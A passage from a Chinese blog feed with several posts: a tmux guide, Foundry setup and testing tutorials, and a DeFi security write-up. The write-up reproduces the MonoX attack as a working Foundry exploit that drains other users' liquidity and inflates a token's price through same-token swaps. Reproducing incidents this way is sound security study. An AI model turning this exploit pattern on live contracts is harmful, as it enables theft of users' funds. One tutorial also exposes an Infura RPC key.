class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>toeat2()</code><br>传入合约变量，利用address类型进行调用<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function toeat2(cat _add , uint a) public&#123;</span><br><span class="line">    bytes memory method =abi.encodeWithSignature(&quot;eat(uint256)&quot;,a);</span><br><span class="line">    (bool answer, bytes memory value) = address(_add).call(method);  //通过bytes32(keccak256(&quot;eat()&quot;指定方法，后面的是参数</span><br><span class="line">    require(answer, &quot;call failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>智能合约</category>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>智能合约</tag>
      </tags>
  </entry>
  <entry>
    <title>Tmux服务器使用</title>
    <url>/2023/12/16/Tmux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Tmux是干什么的？"><a href="#Tmux是干什么的？" class="headerlink" title="Tmux是干什么的？"></a>Tmux是干什么的？</h1><h2 id="会话与进程"><a href="#会话与进程" class="headerlink" title="会话与进程"></a>会话与进程</h2><p>在一个终端中，通过命令行的形式与计算机系统进行交互的方式，称为一个session”会话”。<br>一个典型的例子：通过ssh登陆远程服务器，在服务器跑代码，运行命令的时候，如果ssh连接服务终止的话，那么这个代码、命令的运行也就随即终止了。<br>即ssh窗口和会话里的进程是相绑定的。</p>
<p>之前一直懒得解决这个问题，就电脑一直开着在vscode，或者shell软件里面跑着代码qwq，今天实在忍不了了，去搜了一下，用tmux解决了这个问题。</p>
<h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><p>tmux是一个将会话和窗口的“解绑”工具，将其彻底分离<br>其对我而言主要功能如下：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 允许在单个窗口中，同时运行多个命令行程序，互不影响</span><br><span class="line">2. 让新窗口随时接入、查看已经存在的会话（不同电脑都可以看）</span><br><span class="line">3. 最重要的一点qwq：ssh断了，网断了，也不影响程序跑</span><br></pre></td></tr></table></figure></p>
<h1 id="tmux最实用的语法"><a href="#tmux最实用的语法" class="headerlink" title="tmux最实用的语法"></a>tmux最实用的语法</h1><h2 id="1-新建会话"><a href="#1-新建会话" class="headerlink" title="1. 新建会话"></a>1. 新建会话</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux new -s &lt;session_name&gt;</span><br><span class="line">新建一个会话，给它起个名，之后就用这个连接</span><br></pre></td></tr></table></figure>
<h2 id="2-分离会话，从当前会话推出"><a href="#2-分离会话，从当前会话推出" class="headerlink" title="2. 分离会话，从当前会话推出"></a>2. 分离会话，从当前会话推出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux detach  （ctrl +b   、  d）</span><br></pre></td></tr></table></figure>
<h2 id="3-查看当前所有的会话"><a href="#3-查看当前所有的会话" class="headerlink" title="3. 查看当前所有的会话"></a>3. 查看当前所有的会话</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux ls</span><br></pre></td></tr></table></figure>
<h2 id="4-接入某个运行的会话"><a href="#4-接入某个运行的会话" class="headerlink" title="4. 接入某个运行的会话"></a>4. 接入某个运行的会话</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux attach -t &lt;session-name&gt;</span><br></pre></td></tr></table></figure>
<h2 id="5-关闭某个会话"><a href="#5-关闭某个会话" class="headerlink" title="5. 关闭某个会话"></a>5. 关闭某个会话</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux kiss-session -t &lt;session-name&gt;</span><br></pre></td></tr></table></figure>
<h2 id="6-不常用语法"><a href="#6-不常用语法" class="headerlink" title="6.不常用语法"></a>6.不常用语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 切换会话</span><br><span class="line">tmux switch -t &lt;session-name&gt;</span><br><span class="line">## 重命名会话</span><br><span class="line">tmux rename-session -t &lt;old-name&gt;  &lt;new-name&gt;</span><br></pre></td></tr></table></figure>
<h1 id="更多其它操作可见这个博客"><a href="#更多其它操作可见这个博客" class="headerlink" title="更多其它操作可见这个博客"></a>更多其它操作可见这个博客</h1><p><a href="https://blog.csdn.net/sasa0906/article/details/121132338?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169768574316800192242868%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169768574316800192242868&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-121132338-null-null.142^v96^pc_search_result_base7&amp;utm_term=tmux%E5%A6%82%E4%BD%95%E9%80%80%E5%87%BA&amp;spm=1018.2226.3001.4187">tmux更多用法</a></p>
]]></content>
      <categories>
        <category>linux</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>linux工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Defi安全-Monox攻击事件Foundry复现</title>
    <url>/2024/01/07/Defi%E5%AE%89%E5%85%A8-Monox%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6Foundry%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Mono攻击事件的介绍见：<a href="https://emmanuelwh.github.io/2023/12/23/Defi安全-Monox攻击事件分析/">Defi安全—Monox攻击事件分析—phalcon+etherscan</a></p>
<h2 id="1-前情提要和思路介绍"><a href="#1-前情提要和思路介绍" class="headerlink" title="1. 前情提要和思路介绍"></a>1. 前情提要和思路介绍</h2><p>Monox使用单边池模型，创建的是代币-vCash交易对，添加流动性时，只需添加代币，即可进行任意代币的兑换</p>
<p>主要的漏洞有两个方面：</p>
<ul>
<li>可以在Monox官网查看提供代币流动性的用户地址，但是每个用户的流动性，任意的用户都可以调用移除流动性函数，进行流动性的移除。</li>
<li>在Monoswap的代币交换函数中，并未考虑<code>tokenIn</code> 和<code>tokenOut</code>相等的情况，代码逻辑处理的时候，出现价格覆盖的情况，Mono代币价格异常抬升，具体可见相关攻击实现的分析。</li>
</ul>
<h2 id="2-Foundry复现攻击流程"><a href="#2-Foundry复现攻击流程" class="headerlink" title="2. Foundry复现攻击流程"></a>2. Foundry复现攻击流程</h2><p>foundry进行外部合约调用的时候，用interface定义相应的方法，并定义对应合约的地址，实现外部合约的调用（觉得比较好的方式）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">pragma solidity &gt;=0.7.0 &lt;0.9.0;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function balanceOf(address owner) external view returns (uint256);</span><br><span class="line">    function approve(address spender, uint256 value) external returns (bool);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool);</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IuniswapV2pair &#123;</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IMonoswap &#123;</span><br><span class="line">    function removeLiquidity (address _token, uint256 liquidity, address to,uint256 minVcashOut, uint256 minTokenOut) external returns(uint256 vcashOut, uint256 tokenOut);</span><br><span class="line">    function addLiquidity(address _token, uint256 _amount, address to) external returns (uint256 liquidity);</span><br><span class="line">    function swapExactTokenForToken(</span><br><span class="line">        address tokenIn,</span><br><span class="line">        address tokenOut,</span><br><span class="line">        uint amountIn,</span><br><span class="line">        uint amountOutMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) external returns (uint amountOut);</span><br><span class="line">    function swapTokenForExactToken(</span><br><span class="line">        address tokenIn,</span><br><span class="line">        address tokenOut,</span><br><span class="line">        uint256 amountInMax,</span><br><span class="line">        uint256 amountOut,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 deadline</span><br><span class="line">    ) external returns (uint256 amountIn);</span><br><span class="line">    function pools(address)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (</span><br><span class="line">            uint256 pid,</span><br><span class="line">            uint256 lastPoolValue,</span><br><span class="line">            address token,</span><br><span class="line">            uint8 status,</span><br><span class="line">            uint112 vcashDebt,</span><br><span class="line">            uint112 vcashCredit,</span><br><span class="line">            uint112 tokenBalance,</span><br><span class="line">            uint256 price,</span><br><span class="line">            uint256 createdAt</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IMonoXPool &#123;</span><br><span class="line">    function totalSupplyOf(uint256 pid) external returns (uint256);</span><br><span class="line">    function balanceOf(address account, uint256 id) external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">address constant uniswapv2pair = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;</span><br><span class="line">address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;</span><br><span class="line">address constant Monoswap = 0xC36a7887786389405EA8DA0B87602Ae3902B88A1;</span><br><span class="line">address constant MonoXPool = 0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4;</span><br><span class="line">address constant Mono = 0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D;</span><br><span class="line">address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;</span><br><span class="line"></span><br><span class="line">address constant liquidity_user1 = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;</span><br><span class="line">address constant liquidity_user2 = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;</span><br><span class="line">address constant liquidity_user3 = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;</span><br></pre></td></tr></table></figure>
<p>攻击代码</p>
<p>调用forge进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge test --match-contract test_Monox -vv</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401072215299.png" alt="image-20240107221535861"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract test_Monox is Test&#123;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;https://rpc.ankr.com/eth&quot;, 13_715_025);</span><br><span class="line">    &#125;</span><br><span class="line">    //首先folk以太坊上对应区块的状态</span><br><span class="line">    </span><br><span class="line">    function test_Monox_exploit() public &#123;</span><br><span class="line">        IERC20(Mono).approve(address(Monoswap), type(uint256).max);</span><br><span class="line">        IERC20(weth).deposit&#123;value: address(this).balance, gas: 40_000&#125;();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;WETH balance: &quot;, IERC20(weth).balanceOf(address(this)));</span><br><span class="line">        IERC20(weth).approve(address(Monoswap), 0.1 ether);</span><br><span class="line">		//在进行对应的代币转移的时候，一定要记得先进行approve操作</span><br><span class="line">		</span><br><span class="line">        IMonoswap(Monoswap).swapExactTokenForToken(weth, Mono, 0.1 ether, 1, address(this), 1638278872);</span><br><span class="line">        console.log(&quot;Mono balance:  &quot;, IERC20(Mono).balanceOf(address(this)));</span><br><span class="line">        //提取weth，并调用monoswap的函数，将0.1weth换成对应的Mono代币，易进行后续操作</span><br><span class="line">        </span><br><span class="line">        remove_liquidity_user();</span><br><span class="line">        uint liquidity = IMonoswap(Monoswap).addLiquidity(address(Mono), 196975656, address(this));</span><br><span class="line">        console.log(&quot;attacker gain liquidity: &quot;, liquidity);</span><br><span class="line">		//攻击者自己添加对应的流动性，获得对应LP流动性证明，为后续拉升Mono价格做准备</span><br><span class="line">		</span><br><span class="line">        raise_mono_price();</span><br><span class="line"></span><br><span class="line">        swap_mono_for_weth();</span><br><span class="line">        //将对应高价格的mono代币置换成weth</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function remove_liquidity_user() public &#123;</span><br><span class="line">        </span><br><span class="line">        (uint pid,,,,,,,,) = IMonoswap(Monoswap).pools(address(Mono));</span><br><span class="line">        uint balance = IMonoXPool(MonoXPool).totalSupplyOf(pid);</span><br><span class="line">        console.log(&quot;pid:  &quot;, pid);</span><br><span class="line">        console.log(&quot;monoXpool&#x27;s mono balance: &quot;, balance);</span><br><span class="line"></span><br><span class="line">        uint balance1 = IMonoXPool(MonoXPool).balanceOf(address(liquidity_user1), pid);</span><br><span class="line">        IMonoswap(Monoswap).removeLiquidity(address(Mono), balance1, address(liquidity_user1), 0, 1);</span><br><span class="line"></span><br><span class="line">        uint balance2 = IMonoXPool(MonoXPool).balanceOf(address(liquidity_user2), pid);</span><br><span class="line">        IMonoswap(Monoswap).removeLiquidity(address(Mono), balance2, address(liquidity_user2), 0, 1);</span><br><span class="line"></span><br><span class="line">        uint balance3 = IMonoXPool(MonoXPool).balanceOf(address(liquidity_user3), pid);</span><br><span class="line">        IMonoswap(Monoswap).removeLiquidity(address(Mono), balance3, address(liquidity_user3), 0, 1);</span><br><span class="line">		//漏洞函数，根据phalcon的调用序列，移除对应用户的流动性</span><br><span class="line">        uint balance_afterremove = IMonoXPool(MonoXPool).totalSupplyOf(pid);</span><br><span class="line">        console.log(&quot;monoXpool&#x27;s mono balance after remove liquidity&quot;, balance_afterremove);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function raise_mono_price() public &#123;</span><br><span class="line">        for(uint i = 0 ; i &lt; 55 ; i++)&#123;</span><br><span class="line">            (uint pid ,,,,,,uint tokenBalance,uint price, ) = IMonoswap(Monoswap).pools(address(Mono));</span><br><span class="line">            uint balance = IERC20(Mono).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">            IMonoswap(Monoswap).swapExactTokenForToken(address(Mono), address(Mono), tokenBalance ,0, address(this), 1638278872);</span><br><span class="line"></span><br><span class="line">            console.log(&quot;Mono token Price - &quot;,i,&quot;:  &quot;,  price);</span><br><span class="line">        &#125;</span><br><span class="line">        //按照对应的调用序列，得到池子里的Mono余额，并调用对应的漏洞函数，swapEaxctTokenForToken</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap_mono_for_weth() public &#123;</span><br><span class="line">        </span><br><span class="line">        uint weth_balance = IERC20(weth).balanceOf(address(this));</span><br><span class="line">        console.log(&quot;attacker weth balance: &quot;, weth_balance);</span><br><span class="line"></span><br><span class="line">        uint mono_balance = IERC20(Mono).balanceOf(address(this));</span><br><span class="line">        console.log(&quot;attacker mono balance: &quot;, mono_balance);</span><br><span class="line"></span><br><span class="line">        IuniswapV2pair(uniswapv2pair).swap(0, 547_206_697_433_507_365_949, address(this), &quot;0x00&quot;);</span><br><span class="line">        //闪电贷，借贷weth和usdc的pair对</span><br><span class="line">        uint weth_balance2 = IERC20(weth).balanceOf(address(this));</span><br><span class="line">        console.log(&quot;attacker weth balance: &quot;, weth_balance2 - weth_balance);</span><br><span class="line"></span><br><span class="line">        uint mono_balance2 = IERC20(Mono).balanceOf(address(this));</span><br><span class="line">        console.log(&quot;attacker mono balance: &quot;, mono_balance - mono_balance2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public&#123;</span><br><span class="line"></span><br><span class="line">        uint balance = IERC20(Mono).balanceOf(address(this));</span><br><span class="line">        IMonoswap(Monoswap).swapTokenForExactToken(address(Mono), address(usdc), balance, 4029106880396, address(this), 1638278872);</span><br><span class="line"></span><br><span class="line">        bool success = IERC20(usdc).transfer(address(uniswapv2pair),3029106880396);</span><br><span class="line"></span><br><span class="line">        require(success);</span><br><span class="line">        //在回调函数中，调用monoswap对应的函数，将mono换成对应的usdc，实现对应的usdc还款。</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external returns(bytes4)&#123;</span><br><span class="line">        bytes4 a = bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;));</span><br><span class="line">        // a = 0xf23a6e61</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    //在添加流动性的时候，会回调对应的函数，否则会报错</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击poc如果没有定义相应的的onERC1155Received，则在流动性生成时会报错，如下图所示：</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401072216331.png" alt="image-20240107221633674"></p>
]]></content>
      <categories>
        <category>Defi安全</category>
        <category>安全事件分析</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>安全事件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>foundry使用一</title>
    <url>/2023/12/15/foundry%E4%BD%BF%E7%94%A8(%E4%B8%80)--foundry%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-Foundry环境搭建："><a href="#1-Foundry环境搭建：" class="headerlink" title="1. Foundry环境搭建："></a>1. Foundry环境搭建：</h1><h2 id="1-1-拉取Foundry-镜像"><a href="#1-1-拉取Foundry-镜像" class="headerlink" title="1.1 拉取Foundry 镜像"></a>1.1 拉取<code>Foundry</code> 镜像</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">docker pull ghcr.io/foundry-rs/foundry:latest</span><br></pre></td></tr></table></figure>
<h2 id="1-2-以sh形式，创建一个新的容器，并运行对应的容器"><a href="#1-2-以sh形式，创建一个新的容器，并运行对应的容器" class="headerlink" title="1.2 以sh形式，创建一个新的容器，并运行对应的容器"></a>1.2 以sh形式，创建一个新的容器，并运行对应的容器</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="keyword">run</span><span class="language-bash"> -d -v /local_dir:/docker_dir -it --name new_name image_name /bin/sh</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>-d</code>：让容器在后台运行</li>
<li><code>-v</code>：用以挂载卷</li>
<li><code>-it</code>：用交互模式运行容器，并分配一个伪终端</li>
<li><code>--name</code> ：给容器命名</li>
</ul>
<h2 id="1-3-查看容器的是否运行，以及容器id"><a href="#1-3-查看容器的是否运行，以及容器id" class="headerlink" title="1.3 查看容器的是否运行，以及容器id"></a>1.3 查看容器的是否运行，以及容器id</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure>
<h2 id="1-4-进行容器交互界面"><a href="#1-4-进行容器交互界面" class="headerlink" title="1.4 进行容器交互界面"></a>1.4 进行容器交互界面</h2><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it containerID/name /bin/sh</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>区块链工具</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>区块链工具</tag>
      </tags>
  </entry>
  <entry>
    <title>foundry使用二</title>
    <url>/2023/12/16/foundry%E4%BD%BF%E7%94%A8%E4%BA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="2-Forge："><a href="#2-Forge：" class="headerlink" title="2. Forge："></a>2. Forge：</h1><p>Forge是Foundry附带的命令行工具，用来测试、构建和部署智能合约</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">forge test</span><br></pre></td></tr></table></figure>
<p>运行测试用例，所有测试都是Solidity编写</p>
<p>Forge将从源目录的任何位置查找测试，任何具有以test开头的函数的合约都被认为是一个测试。</p>
<p>通常测试放在<code>src/test中</code></p>
<p>通过传递过滤器运行特定测试：</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">forge test --match-contract ComplicatedContractTest --match-test testDeposit</span><br></pre></td></tr></table></figure>
<p>这将在名称中带有 <code>testDeposit</code> 的 <code>ComplicatedContractTest</code> 测试合约中运行测试。</p>
<h2 id="2-1-编写测试："><a href="#2-1-编写测试：" class="headerlink" title="2.1 编写测试："></a>2.1 编写测试：</h2><p>测试代码是用Solidity编写的，最常见的测试编写是通过<code>Forge</code> <em>**</em>标准库的<code>Test</code>合约实现。</p>
<p>使用Forge标准库，会利用到DSTest合约，其提供基本的日志记录和断言功能</p>
<p>导入<code>forge-std/Test.sol</code> 并继承自测试合约<code>Test</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br></pre></td></tr></table></figure>
<p>一个测试案例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ContractBTest is Test &#123;</span><br><span class="line">    uint256 testNumber;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        testNumber = 42;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testNumberIs42() public &#123;</span><br><span class="line">        assertEq(testNumber, 42);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testFailSubtract43() public &#123;</span><br><span class="line">        testNumber -= 43;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>setUp()</code> :在每个测试用例运行之前调用的可选函数</li>
<li><code>test()</code> :以<code>test</code> 为前缀的函数作为测试用例执行</li>
<li><code>testFail()</code> :<code>test</code> 的相反情况，如果函数没有报错revert，那么测试失败</li>
</ul>
<blockquote>
<p>测试函数必须具有<code>external</code> 或<code>public</code> ，否则测试函数将无效</p>
</blockquote>
<h2 id="2-2-cheatcodes"><a href="#2-2-cheatcodes" class="headerlink" title="2.2 cheatcodes"></a>2.2 cheatcodes</h2><p>为了操纵区块链的状态，以及测试特定的<code>reverts</code> 和事件<code>Events</code> ，Foundry附带一组cheatcodes</p>
<p>通过Forge标准库中的<code>Test</code> 合约提供的<code>vm</code> 实例可以访问cheatcode。</p>
<p>以一个例子进行详细说明：</p>
<p>我们的目的是为了验证一个合约的函数只能被合约所有者所调用，编写个测试</p>
<p>在<code>./test</code> 文件夹下添加一个Owner.t.sol测试文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.8.10;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">error Unauthorized();</span><br><span class="line"></span><br><span class="line">contract OwnerUpOnly &#123;</span><br><span class="line">    address public immutable owner;</span><br><span class="line">    uint256 public count;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function increment() external &#123;</span><br><span class="line">        if (msg.sender != owner) &#123;</span><br><span class="line">            revert Unauthorized();</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract OwnerUpOnlyTest is Test &#123;</span><br><span class="line">    OwnerUpOnly upOnly;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        upOnly = new OwnerUpOnly();</span><br><span class="line">    &#125;</span><br><span class="line">    function testIncrementAsOwner() public &#123;</span><br><span class="line">        assertEq(upOnly.count(), 0);</span><br><span class="line">        upOnly.increment();</span><br><span class="line">        assertEq(upOnly.count(), 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行<code>forge test</code> ,发现测试通过</p>
<p>接下来测试不是所有者的人不能增加计数</p>
<p>合约<code>OwnerUpOnlyTest</code> 中添加一函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function testIncrementAsNotOwner() public &#123;</span><br><span class="line">        vm.prank(address(0));</span><br><span class="line">        upOnly.increment();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>再次运行<code>forge test</code> ,发现测试revert，说明不是合约所有者不能增加计数</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312161100300.png" alt="forge test示例"></p>
<p><code>**vm.prank(address)</code>** cheatcode将msg.sender的身份更改为零地址后，进行下一次调用，保证调用者不是合约所有者。</p>
<p>完整的 <code>cheatcode</code> 的详细介绍可见 [<a href="https://learnblockchain.cn/docs/foundry/i18n/zh/cheatcodes/index.html">Cheatcodes 参考 - Foundry 中文文档 (learnblockchain.cn)</a>]</p>
<h2 id="2-3-Forge标准库概览"><a href="#2-3-Forge标准库概览" class="headerlink" title="2.3 Forge标准库概览"></a>2.3 Forge标准库概览</h2><p><code>Forge Std</code>提供了编写测试代码所需的所有基本功能</p>
<ul>
<li><code>Vm.sol</code>：最新的作弊码接口</li>
<li><code>console.sol</code> 和 <code>console2.sol</code>：Hardhat 风格的日志记录功能</li>
<li><code>Script.sol</code>：<a href="https://learnblockchain.cn/docs/foundry/i18n/zh/tutorials/solidity-scripting.html">Solidity 脚本</a> 的基本实用程序</li>
<li><code>Test.sol</code>：DSTest 的超集，包含标准库、作弊码实例 (<code>vm</code>) 和 Hardhat 控制台</li>
</ul>
<h2 id="2-4-了解Traces"><a href="#2-4-了解Traces" class="headerlink" title="2.4 了解Traces"></a>2.4 了解Traces</h2><p>Forge可以为失败的测试（<code>-vvv</code>）或所有测试（<code>-vvvv</code>）生成跟踪<code>Traces</code></p>
<p><code>Traces</code> 的不同颜色</p>
<ul>
<li><strong>绿色</strong>：对于不会 revert 的调用</li>
<li><strong>红色</strong>：用于有 revert 的调用</li>
<li><strong>蓝色</strong>：用于调用作弊码</li>
<li><strong>青色</strong>：用于触发日志</li>
<li><strong>黄色</strong>：用于合约部署<br><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312161100797.png" alt="forge trace示例">   </li>
</ul>
<h2 id="2-5-分叉测试"><a href="#2-5-分叉测试" class="headerlink" title="2.5 分叉测试"></a>2.5 分叉测试</h2><p>Forge支持使用两种不同方式进行分叉测试：</p>
<ul>
<li>分叉模式（Forking Mode）：通过<code>forge test --fork-url</code> 标准使用一个单独分叉进行所有测试</li>
<li>分叉作弊码（Forking Cheatcodes)：通过<a href="https://learnblockchain.cn/docs/foundry/i18n/zh/cheatcodes/forking.html">forking 作弊码</a> 在 Solidity 测试代码中直接创建、选择和管理多个分叉</li>
</ul>
<h3 id="2-5-1-分叉模式："><a href="#2-5-1-分叉模式：" class="headerlink" title="2.5.1 分叉模式："></a>2.5.1 分叉模式：</h3><p>通过<code>--fork-url</code> 传递RPC URL，<code>--fork-block-number</code> 指定分叉的区块高度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge test --fork-url &quot;https://mainnet.infura.io/v3/10973852e3ce414296d70fd551402e92&quot; --fork-block-number 17001200</span><br></pre></td></tr></table></figure>
<h3 id="2-5-2分叉作弊码："><a href="#2-5-2分叉作弊码：" class="headerlink" title="2.5.2分叉作弊码："></a>2.5.2分叉作弊码：</h3><p>在Solidity测试代码中以编程方式进入分叉模式。</p>
<p>Foundry测试代码中：所有的测试函数的隔离的，每个测试函数都使用<code>setup()</code> 之后的拷贝状态执行, <code>setup()</code> 期间创建的分支可用于测试。</p>
<ul>
<li><code>createFork(&#39;mainnet&#39;, blocknumber)</code> cheatcode创建分支，并返回唯一的标识符</li>
<li><code>selectFork(Forkid)</code> 传递Forkid，启用对应的分支</li>
<li><code>activeFork()</code> 返回当前启用分支的Forkid</li>
<li><code>rollFork(blocknumber)</code> 设置分叉的区块高度</li>
</ul>
<p>每个分叉是一个独立的EVM，所有分叉使用完全独立的存储，但<code>msg.sender</code> 的状态和测试合约本身在分叉更改中是持久的</p>
]]></content>
      <categories>
        <category>区块链工具</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>区块链工具</tag>
      </tags>
  </entry>
  <entry>
    <title>python与智能合约交互（测试链）</title>
    <url>/2023/12/16/python%E4%B8%8E%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E4%BA%A4%E4%BA%92%EF%BC%88%E6%B5%8B%E8%AF%95%E9%93%BE%EF%BC%89/</url>
